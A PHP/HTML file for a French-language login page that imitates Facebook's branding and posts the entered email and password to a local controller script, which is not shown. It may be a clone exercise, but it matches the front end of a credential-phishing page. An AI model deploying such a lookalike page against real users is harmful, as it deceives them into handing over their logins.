<?php
    require ('Models/Database.php');
    require('Models/function.php')
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href= "style.css">
   
</head>
<body>

<div class='bigContainer'>


        <div class="container">
            <div class="RandomInfos">
                <h2 class = "logo">facebook</h2>
                <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
            </div>
            <div class="loginForm">     

                <form method="POST" action = "Controller/controller.php?status=OK" class="form">
                            <!-- Email input -->
                            
                                <input name="username" type="email" placeholder="Adresse email ou numero de Tel"  />

                                <!-- Password input -->

                                    <input name="password" type="password" placeholder="mot de passe"  />

                                <!-- Submit button -->
                                <button type="submit" class="button" >Se connecter</button>

                                <a href="">mot de passe oublié</a>
                                
                                <button type="submit" class="button2" >Créer nouveau compte</button>
                                
                           
                                

                </form>
                        
                       
                
            </div>
        </div>
</div>
</body>
</html>